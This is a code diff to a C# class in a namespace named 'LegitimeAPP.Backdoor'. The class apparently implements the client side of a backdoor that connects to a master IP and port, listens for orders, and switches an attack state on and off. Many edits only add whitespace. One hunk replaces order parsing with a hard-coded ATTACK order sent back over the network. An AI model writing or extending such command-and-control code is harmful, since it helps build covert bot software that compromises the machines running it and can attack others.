@@ -26,7 +26,10 @@ namespace LegitimeAPP.Backdoor {
         private Thread _FollowingOrders ;
         private Thread _ConnectionRequests ;
 
-        private Order order ;         
+        private Order order ;
+
+        
+                 
 
         // Encoding 
 
@@ -35,20 +38,32 @@ namespace LegitimeAPP.Backdoor {
 
         public Connection(string masterIP, int masterPort) {
 
-            order = new Order() ;
 
 
-            _attackInProgress = false; 
+            order = new Order(TypeAction.WAIT) ;
 
-            order.NewAttackOrder += delegate {
+
+                order.NewAttackOrder += delegate {
                 Console.WriteLine("L'attaque est on") ;
+
+
+
                 _attackInProgress = true ; 
             } ;
 
             order.EndAttackOrder += delegate {
                 Console.WriteLine("L'attaque est off") ;
+
                 _attackInProgress = false ;  
-            } ; 
+            } ;  
+
+
+
+
+
+
+            _attackInProgress = false; 
+
 
             enc = new ASCIIEncoding() ;
 
@@ -61,7 +76,10 @@ namespace LegitimeAPP.Backdoor {
             _FollowingOrders = new Thread(ListeningOrder) ;
             _FollowingOrders.Name = "" ;
 
-            _ConnectionRequests.Start() ; 
+            _ConnectionRequests.Start() ;
+
+
+ 
              
         }
 
@@ -133,6 +151,7 @@ namespace LegitimeAPP.Backdoor {
 }
 
         private void ListeningOrder() {
+
             while(true) {
 
                 try {
@@ -146,10 +165,14 @@ namespace LegitimeAPP.Backdoor {
 
                     if ( !_attackInProgress ) {
 
+                        
 
-                        Order order = Data<Order>.XmlToData(message) ; 
 
-       
+                        Console.WriteLine(message) ; 
+ 
+                        //Order order = Data<Order>.XmlToData(message) ; 
+
+                        WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.ATTACK))) ; 
                             order.Change(order) ;
                             order.Start() ;  
                       
